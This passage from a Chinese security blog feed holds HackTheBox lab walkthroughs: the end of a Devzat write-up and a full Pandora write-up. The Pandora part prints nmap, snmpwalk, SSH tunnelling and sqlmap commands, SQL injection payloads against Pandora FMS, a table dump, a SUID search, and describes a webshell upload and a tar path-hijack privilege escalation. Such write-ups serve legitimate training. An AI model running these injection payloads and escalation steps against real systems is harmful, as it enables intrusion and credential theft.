<h2 id="提权到ROOT"><a href="#提权到ROOT" class="headerlink" title="提权到ROOT"></a>提权到ROOT</h2><p>没办法，我们找二进制文件也没找到个所以然，只能再运行一遍神器<code>linpeas.sh</code>这个脚本了。在<code>/var/backups</code>这个目录上，发现了很多有趣的文件，如<code>devzat-main.zip、devzat-dev.zip</code>这两个压缩包<br><img src="https://img-blog.csdnimg.cn/c525a8de4c3d4b40a111283e562b2b51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将其复制到tmp目录解压，查看其中的commands.go文件存在可利用的漏洞点，比较main目录和dev目录下的commands.go文件的不同发现有一处对密码进行校验。这里我们要注意两个点，一个是fileCommand的方法，另一个是校验安全密码，如果密码不对直接结束方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diff commands.go ../dev/commands.go</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/29c143180e4443d18159280a01e19b46.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在审计GO代码时，我们发现对应的方法名字就是我们能执行命令的名字，但是唯独缺少了这个file命令，而且还存在校验密码的环节，所以很有可能是突破口。在审计dev目录下的<code>devchat.go</code>文件发现，dev目录的功能是运行在目标主机的8443端口<br><img src="https://img-blog.csdnimg.cn/7394175f0acc43df862c9682f307a261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8ea29539414a45bd9212598564ebf766.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我发现在反弹的shell中，并不能实现ssh的内部端口连接。但是很幸运我在.ssh中找到了登录凭据<br><img src="https://img-blog.csdnimg.cn/498aedec26e24f7992495a71c3752cc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7bb674ed77754fd983ba72c1fca5871a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功使用patrick账户登录<br><img src="https://img-blog.csdnimg.cn/c15e1617dda34fca9a8907f068b10ba9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现没有密码，均报错<br><img src="https://img-blog.csdnimg.cn/e925745b20b0407da04aac8ff435be8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试使用密码看看返回信息有什么不同，它说不存在这个目录，那我们返回上一目录直接读取到flag了<br><img src="https://img-blog.csdnimg.cn/4e14ed39838a46aeaffee1d47487d666.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/81bc37ed464242f087cb32aea8552a80.png" alt="在这里插入图片描述"><br>同时我们也可以读取root的id_rsa进行获取root权限<br><img src="https://img-blog.csdnimg.cn/ceb27ddf47dd414e87f7ecebb2dc7d59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/aa49ba11351148f482600c39b2b45ceb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说这个靶机相当复杂，同时考验GO语言的代码审计能力，获取权限的方式比较复杂，但是更加偏向于实战，这是一个非常出色的靶机。</p>
]]></content>
      <categories>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandora</title>
    <url>/2022/01/29/Pandora/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap进行扫描，发现开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/48eada2d8ed648a595409ecb9caca3d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问web服务后，并且进行了目录扫描，并没有发现有价值的信息<br><img src="https://img-blog.csdnimg.cn/fe6b324e74084ed0928913421517ca43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/ed3d2aea22f248afb8426175c235d2c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>切换一个思路，看看有没有子域名，结果也是落空</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&quot;http://pandora.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 33560 -H <span class="string">&quot;HOST:FUZZ.pandora.htb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/afadb89eddb94b41bdfafaf6a93b236f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>至此，我的思路断了。想了很久发现会不会信息收集的时候做得不够细，然后再去扫描UDP的端口服务，有发现新的突破口。目标主机开放了snmp服务，我们可以使用snmpwalk工具对snmp的信息进行更仔细地扫描。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A -sU -oN udp_result -top-ports=20 pandora.htb</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注：-top-ports参数是扫描开放概率最高的 number 个端口，出现的概率需要 参考 nmap-services 文件</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/18f56ac60b064d3f8f0a54448943b8dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 2c pandora.htb -c public &gt; pandora.snmp</span><br></pre></td></tr></table></figure>
<p>信息量比较大，需要我们一点点仔细地搜索，发现存在了账户和密码。<br><img src="https://img-blog.csdnimg.cn/1dad4db69f9c4b5cac4313a48bfdd81c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们尝试登录，发现还存在另一个用户matt，但是没有权限查看到user.txt文件，目测应该是要提权到matt用户权限上去<br><img src="https://img-blog.csdnimg.cn/62b8997975c64b5d8c6401a090658316.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看对应的端口服务时，发现本地运行了一个web服务<br><img src="https://img-blog.csdnimg.cn/25dd276877264e0db29d0adf34018fcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d864bcd769264cf58355770bea67dd43.png" alt="在这里插入图片描述"><br>那么思路来了，我们可以利用端口转发技术，将目标机器的80端口转发到本机的80端口上进行访问。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 80:127.0.0.1:80 daniel@pandora.htb</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/caadd0a4e8a04a66950947136404bca3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>紧接着我们访问本机的80端口，发现是一个pandora的FMS框架搭建的web服务，并且版本是<code>v7.0NG.742</code><br><img src="https://img-blog.csdnimg.cn/cc07c69796d8428aa962521a3aba1d6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在搜索引擎上搜到，存在SQL注入的可能性，并且在相对应的目录上存在SQL注入漏洞。<br><img src="https://img-blog.csdnimg.cn/44fd0991127a4d16ba6a36debf10b49d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/84f551a7ff9e4e7b9e1224d1a92ac12a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>那么就使用SQLMAP进行尝试注入吧，结果显示真的存在GET注入，数据库类型为MySQL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot;</span> --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ed03893394f6472ea708afa9cf6bd75c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看数据库名、数据表等信息<br><img src="https://img-blog.csdnimg.cn/8269e50d7ce543b5a8db603075863fec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot;</span> --batch --dbms=mysql -D pandora --tables</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                       </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.6<span class="comment">#stable&#125;                                                                                                             </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                                                                          </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                                          </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                       </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 22:29:53 /2022-01-28/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[22:29:54] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[22:29:54] [WARNING] potential permission problems detected (&#x27;</span>Access denied<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;</span>PHPSESSID=6ehkvd19mc3...lt5pi9cq7a<span class="string">&#x27;). Do you want to use those [Y/n] Y</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: session_id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span></span><br><span class="line"><span class="string">    Payload: session_id=1&#x27;</span> AND 7308=(SELECT (CASE WHEN (7308=7308) THEN 7308 ELSE (SELECT 8935 UNION SELECT 7585) END))-- -</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: session_id=1<span class="string">&#x27; OR (SELECT 8665 FROM(SELECT COUNT(*),CONCAT(0x716b707a71,(SELECT (ELT(8665=8665,1))),0x7171717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aGWu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: session_id=1&#x27;</span> AND (SELECT 3440 FROM (SELECT(SLEEP(5)))OagF)-- HMIA</span><br><span class="line">---</span><br><span class="line">[22:29:54] [INFO] testing MySQL</span><br><span class="line">[22:29:54] [INFO] confirming MySQL</span><br><span class="line">[22:29:54] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[22:29:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)</span><br><span class="line">web application technology: Apache 2.4.41, PHP</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="line">[22:29:54] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;pandora&#x27;</span></span><br><span class="line">Database: pandora</span><br><span class="line">[178 tables]</span><br><span class="line">+------------------------------------+</span><br><span class="line">| taddress                           |</span><br><span class="line">| taddress_agent                     |</span><br><span class="line">| tagent_access                      |</span><br><span class="line">| tagent_custom_data                 |</span><br><span class="line">| tagent_custom_fields               |</span><br><span class="line">| tagent_custom_fields_filter        |</span><br><span class="line">| tagent_module_inventory            |</span><br><span class="line">| tagent_module_log                  |</span><br><span class="line">| tagent_repository                  |</span><br><span class="line">| tagent_secondary_group             |</span><br><span class="line">| tagente                            |</span><br><span class="line">| tagente_datos                      |</span><br><span class="line">| tagente_datos_inc                  |</span><br><span class="line">| tagente_datos_inventory            |</span><br><span class="line">| tagente_datos_log4x                |</span><br><span class="line">| tagente_datos_string               |</span><br><span class="line">| tagente_estado                     |</span><br><span class="line">| tagente_modulo                     |</span><br><span class="line">| talert_actions                     |</span><br><span class="line">| talert_commands                    |</span><br><span class="line">| talert_snmp                        |</span><br><span class="line">| talert_snmp_action                 |</span><br><span class="line">| talert_special_days                |</span><br><span class="line">| talert_template_module_actions     |</span><br><span class="line">| talert_template_modules            |</span><br><span class="line">| talert_templates                   |</span><br><span class="line">| tattachment                        |</span><br><span class="line">| tautoconfig                        |</span><br><span class="line">| tautoconfig_actions                |</span><br><span class="line">| tautoconfig_rules                  |</span><br><span class="line">| tcategory                          |</span><br><span class="line">| tcluster                           |</span><br><span class="line">| tcluster_agent                     |</span><br><span class="line">| tcluster_item                      |</span><br><span class="line">| tcollection                        |</span><br><span class="line">| tconfig                            |</span><br><span class="line">| tconfig_os                         |</span><br><span class="line">| tcontainer                         |</span><br><span class="line">| tcontainer_item                    |</span><br><span class="line">| tcredential_store                  |</span><br><span class="line">| tdashboard                         |</span><br><span class="line">| tdatabase                          |</span><br><span class="line">| tdeployment_hosts                  |</span><br><span class="line">| tevent_alert                       |</span><br><span class="line">| tevent_alert_action                |</span><br><span class="line">| tevent_custom_field                |</span><br><span class="line">| tevent_extended                    |</span><br><span class="line">| tevent_filter                      |</span><br><span class="line">| tevent_response                    |</span><br><span class="line">| tevent_rule                        |</span><br><span class="line">| tevento                            |</span><br><span class="line">| textension_translate_string        |</span><br><span class="line">| tfiles_repo                        |</span><br><span class="line">| tfiles_repo_group                  |</span><br><span class="line">| tgis_data_history                  |</span><br><span class="line">| tgis_data_status                   |</span><br><span class="line">| tgis_map                           |</span><br><span class="line">| tgis_map_connection                |</span><br><span class="line">| tgis_map_has_tgis_map_con          |</span><br><span class="line">| tgis_map_layer                     |</span><br><span class="line">| tgis_map_layer_groups              |</span><br><span class="line">| tgis_map_layer_has_tagente         |</span><br><span class="line">| tgraph                             |</span><br><span class="line">| tgraph_source                      |</span><br><span class="line">| tgraph_source_template             |</span><br><span class="line">| tgraph_template                    |</span><br><span class="line">| tgroup_stat                        |</span><br><span class="line">| tgrupo                             |</span><br><span class="line">| tincidencia                        |</span><br><span class="line">| titem                              |</span><br><span class="line">| tlanguage                          |</span><br><span class="line">| tlayout                            |</span><br><span class="line">| tlayout_data                       |</span><br><span class="line">| tlayout_template                   |</span><br><span class="line">| tlayout_template_data              |</span><br><span class="line">| tlink                              |</span><br><span class="line">| tlocal_component                   |</span><br><span class="line">| tlog_graph_models                  |</span><br><span class="line">| tmap                               |</span><br><span class="line">| tmensajes                          |</span><br><span class="line">| tmetaconsole_agent                 |</span><br><span class="line">| tmetaconsole_agent_secondary_group |</span><br><span class="line">| tmetaconsole_event                 |</span><br><span class="line">| tmetaconsole_event_history         |</span><br><span class="line">| tmetaconsole_setup                 |</span><br><span class="line">| tmigration_module_queue            |</span><br><span class="line">| tmigration_queue                   |</span><br><span class="line">| tmodule                            |</span><br><span class="line">| tmodule_group                      |</span><br><span class="line">| tmodule_inventory                  |</span><br><span class="line">| tmodule_relationship               |</span><br><span class="line">| tmodule_synth                      |</span><br><span class="line">| tnetflow_filter                    |</span><br><span class="line">| tnetflow_report                    |</span><br><span class="line">| tnetflow_report_content            |</span><br><span class="line">| tnetwork_component                 |</span><br><span class="line">| tnetwork_component_group           |</span><br><span class="line">| tnetwork_map                       |</span><br><span class="line">| tnetwork_matrix                    |</span><br><span class="line">| tnetwork_profile                   |</span><br><span class="line">| tnetwork_profile_component         |</span><br><span class="line">| tnetworkmap_ent_rel_nodes          |</span><br><span class="line">| tnetworkmap_enterprise             |</span><br><span class="line">| tnetworkmap_enterprise_nodes       |</span><br><span class="line">| tnews                              |</span><br><span class="line">| tnota                              |</span><br><span class="line">| tnotification_group                |</span><br><span class="line">| tnotification_source               |</span><br><span class="line">| tnotification_source_group         |</span><br><span class="line">| tnotification_source_group_user    |</span><br><span class="line">| tnotification_source_user          |</span><br><span class="line">| tnotification_user                 |</span><br><span class="line">| torigen                            |</span><br><span class="line">| tpassword_history                  |</span><br><span class="line">| tperfil                            |</span><br><span class="line">| tphase                             |</span><br><span class="line">| tplanned_downtime                  |</span><br><span class="line">| tplanned_downtime_agents           |</span><br><span class="line">| tplanned_downtime_modules          |</span><br><span class="line">| tplugin                            |</span><br><span class="line">| tpolicies                          |</span><br><span class="line">| tpolicy_agents                     |</span><br><span class="line">| tpolicy_alerts                     |</span><br><span class="line">| tpolicy_alerts_actions             |</span><br><span class="line">| tpolicy_collections                |</span><br><span class="line">| tpolicy_groups                     |</span><br><span class="line">| tpolicy_modules                    |</span><br><span class="line">| tpolicy_modules_inventory          |</span><br><span class="line">| tpolicy_plugins                    |</span><br><span class="line">| tpolicy_queue                      |</span><br><span class="line">| tprofile_view                      |</span><br><span class="line">| tprovisioning                      |</span><br><span class="line">| tprovisioning_rules                |</span><br><span class="line">| trecon_script                      |</span><br><span class="line">| trecon_task                        |</span><br><span class="line">| trel_item                          |</span><br><span class="line">| tremote_command                    |</span><br><span class="line">| tremote_command_target             |</span><br><span class="line">| treport                            |</span><br><span class="line">| treport_content                    |</span><br><span class="line">| treport_content_item               |</span><br><span class="line">| treport_content_item_temp          |</span><br><span class="line">| treport_content_sla_com_temp       |</span><br><span class="line">| treport_content_sla_combined       |</span><br><span class="line">| treport_content_template           |</span><br><span class="line">| treport_custom_sql                 |</span><br><span class="line">| treport_template                   |</span><br><span class="line">| treset_pass                        |</span><br><span class="line">| treset_pass_history                |</span><br><span class="line">| tserver                            |</span><br><span class="line">| tserver_export                     |</span><br><span class="line">| tserver_export_data                |</span><br><span class="line">| tservice                           |</span><br><span class="line">| tservice_element                   |</span><br><span class="line">| tsesion                            |</span><br><span class="line">| tsesion_extended                   |</span><br><span class="line">| tsessions_php                      |</span><br><span class="line">| tskin                              |</span><br><span class="line">| tsnmp_filter                       |</span><br><span class="line">| ttag                               |</span><br><span class="line">| ttag_module                        |</span><br><span class="line">| ttag_policy_module                 |</span><br><span class="line">| ttipo_modulo                       |</span><br><span class="line">| ttransaction                       |</span><br><span class="line">| ttrap                              |</span><br><span class="line">| ttrap_custom_values                |</span><br><span class="line">| tupdate                            |</span><br><span class="line">| tupdate_journal                    |</span><br><span class="line">| tupdate_package                    |</span><br><span class="line">| tupdate_settings                   |</span><br><span class="line">| tuser_double_auth                  |</span><br><span class="line">| tuser_task                         |</span><br><span class="line">| tuser_task_scheduled               |</span><br><span class="line">| tusuario                           |</span><br><span class="line">| tusuario_perfil                    |</span><br><span class="line">| tvisual_console_elements_cache     |</span><br><span class="line">| twidget                            |</span><br><span class="line">| twidget_dashboard                  |</span><br><span class="line">+------------------------------------+</span><br><span class="line"></span><br><span class="line">[22:29:54] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/127.0.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 22:29:54 /2022-01-28/</span><br></pre></td></tr></table></figure>
<p>这里重点关注两个数据库<code>tsessions_php</code>和<code>tpassword_history</code>，分别对这两个数据表的字段内容进行注入分析。因为tsessions_php的字段内容比较多，这里不再赘述。主要分析的是后者的字段内容信息。<br><img src="https://img-blog.csdnimg.cn/b7e6dbfbe3d443c78888e862a89eed3e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b6bded70d34c46b1a18a13a217c21b7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot;</span> --batch --dbms=mysql -D pandora -T tpassword_history -C date_begin,date_end,id_pass,id_user,password --dump</span><br></pre></td></tr></table></figure>
<p>得到了matt用户的hash值，但是很可惜并不能解密出对应的明文值信息。因此我们只能换一个思路了。<br><img src="https://img-blog.csdnimg.cn/6f758c4b67394f73be33a91e9518b67c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>继续在网上查阅资料发现，存在一个poc能直接使用admin账户进行登录后台，这是链接地址<a href="https://github.com/zjicmDarkWing/CVE-2021-32099">https://github.com/zjicmDarkWing/CVE-2021-32099</a><br><img src="https://img-blog.csdnimg.cn/98310996012a4ee6b1a2c970d72d04ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录成功后，发现存在一个文件上传的点，这里我们可以上传webshell<br><img src="https://img-blog.csdnimg.cn/a47737aa634c4cec91d3fd880a38c75d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>随便点击一个目录，url上提示是images目录<br><img src="https://img-blog.csdnimg.cn/e1ee7e89e35c4b97b1c0f57895caded0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上传webshell后，打开监听并获取反弹的shell<br><img src="https://img-blog.csdnimg.cn/2f98f37576d14269a134646cf7a3e27f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权ROOT"><a href="#提权ROOT" class="headerlink" title="提权ROOT"></a>提权ROOT</h2><p>获取到matt用户的权限后，我们的下一个目标就是最高权限了。首先我们先查看可执行的二进制文件都有哪些。最显眼的是<code>/usr/bin/pandora_backup</code>这个可执行文件目录，我们可以尝试执行它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/98051e0814b44154b2e0ab038a77f571.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是报了权限不够的错误，并且不但权限不够，因此我们需要一个更加稳定的shell外壳。<br><img src="https://img-blog.csdnimg.cn/e1ae01ac699e4398bdc9dc69a131fc44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>由于我们并没有解密到matt用户的明文密码，因此我们只能手撕ssh连接了。<br><img src="https://img-blog.csdnimg.cn/6cd2cba3f9724a5aa9e3ffff6c345b8f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>生成了id_rsa文件后，我们得再生成一个验证文件，并且全部都设置为可读可写权限，但是不能执行。<br><img src="https://img-blog.csdnimg.cn/ebcbf9930fdc474ca8cc9b360eb48af6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们把id_rsa的内容保存在本地上<br><img src="https://img-blog.csdnimg.cn/fb32e81db1424168bfc18bcba009b3c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7db0877f59e04a3595eea89001efb8ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再次执行之前的备份命令时，发现执行成功了<br><img src="https://img-blog.csdnimg.cn/5d11948fcb0248849fb147a9ca08d345.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们的思路又来了，既然这个是个可执行的二进制文件，那么我们可以将root的shell路径写入到tar命令中，从而获取最高的权限。<br><img src="https://img-blog.csdnimg.cn/3491c9fa9d5c4fda99e0b2c641d66904.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/83e5ff7b6e2e4c56afd37607ba212552.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
